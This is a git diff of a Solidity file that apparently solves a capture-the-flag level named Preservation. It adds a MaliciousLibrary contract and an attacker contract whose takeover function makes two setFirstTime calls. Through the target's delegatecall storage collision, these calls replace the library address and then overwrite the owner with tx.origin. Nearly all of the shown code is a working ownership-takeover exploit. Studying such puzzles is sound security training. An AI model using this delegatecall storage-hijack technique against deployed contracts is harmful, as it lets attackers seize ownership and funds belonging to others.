@@ -27,9 +27,7 @@ contract Preservation {
     timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
   }
 }
-
-/* Library that the initial thought it was calling
-// Simple library contract to set the time
+/*
 contract LibraryContract {
 
   // stores a timestamp 
@@ -40,18 +38,31 @@ contract LibraryContract {
   }
 }
 */
+//
+contract MaliciousLibrary {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function setTime(uint _time) public {
+        
+        owner = tx.origin;
+    }
+}
 
 contract getOwner {
     Preservation public preserve;
-    address trueOwner = tx.origin;
+    MaliciousLibrary public lib;
 
     constructor(address _presCon) public {
         preserve = Preservation(_presCon);
+        lib = new MaliciousLibrary();
     }
 
-    function takeover() public returns (address success) {
-        uint256 curTime = block.timestamp - 5;
-        address(preserve).call(abi.encodeWithSignature("setFirstTime(uint)", curTime));
-        return trueOwner;
+    function takeover() public {
+        // step to set the storage owner as tx.origin
+        preserve.setFirstTime(uint256(address(lib)));
+        preserve.setFirstTime(0);
+        
     }
 }
